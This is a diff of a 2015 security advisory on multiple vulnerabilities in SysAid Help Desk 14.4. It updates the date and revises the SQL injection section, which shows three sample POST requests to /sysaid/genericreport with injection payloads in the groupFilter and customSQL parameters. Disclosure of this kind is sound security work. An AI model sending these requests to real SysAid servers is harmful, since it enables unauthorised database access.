@@ -1,7 +1,7 @@
 >> Multiple vulnerabilities in SysAid Help Desk 14.4
 >> Discovered by Pedro Ribeiro (pedrib@gmail.com), Agile Information Security
 =================================================================================
-Disclosure: 03/06/2015 / Last updated: 03/06/2015
+Disclosure: 03/06/2015 / Last updated: 10/06/2015
 
 >> Background on the affected product:
 "SysAid is an ITSM solution that offers all the essentials, with everything you need for easy and efficient IT support and effective help desk operations. Its rich set of features includes a powerful service desk, asset management and discovery, self-service, and easy-to-use tools for understanding and optimizing IT performance."
@@ -131,20 +131,15 @@ a)
 POST /sysaid/genericreport HTTP/1.1
 action=execute&reportName=AssetDetails&scheduleReportParm=null&reportTitle=Asset+Details&company=0&filter=group&groupFilter='&assetID=&assetName=Click+Browse+to+choose&expressionCaption=&customExpression=&customSQL=&outFormat=PDF&userName1=admin&viewNow=checkbox&scheduleStart=26-01-2015+06%3A27&reRunEvery=2&user1=admin
 
-Parameters:
-groupFilter
-
 action=execute&reportName=TopAdministratorsByAverageTimer&scheduleReportParm=null&reportTitle=Administrators+with+the+longest+SRs+time+%28average%29&sr_types=1&company=0&timer=1&expressionCaption=&customExpression=&customSQL=select+*+from+bla&DatePeriod=1&fromDate=26-12-2014&toDate=27-01-2015&NumRecords=5&outFormat=PDF&userName1=admin&viewNow=checkbox&scheduleStart=26-01-2015+07%3A03&reRunEvery=2&user1=admin&groupingSelection=Administrator&groupingSelectionName=Administrators&subGroupingSelection=AverageTimer&Activity=no
-
-Parameters:
-customSQL
 
 action=execute&reportName=ActiveRequests&scheduleReportParm=null&assetID=&reportTitle=Active+Records&category=000ALL&subcategory=000ALL&thirdLevelCategory=000ALL&sr_types=1&company=0&groupFilter=ALL&expressionCaption=&customExpression=&customSQL='&groupingSelection=Category&DatePeriod=1&fromDate=26-12-2014&toDate=27-01-2015&outFormat=PDF&userName1=admin&viewNow=checkbox&scheduleStart=26-01-2015+07%3A08&reRunEvery=2&user1=admin
 
 Parameters:
+groupFilter
 customSQL
 
-(3 different payloads are shown because the reportName parameter seems to change which parameters have the injection)
+(3 sample payloads are shown - the reportName has to be valid and each reportName expects different parameters)
 
 
 b)
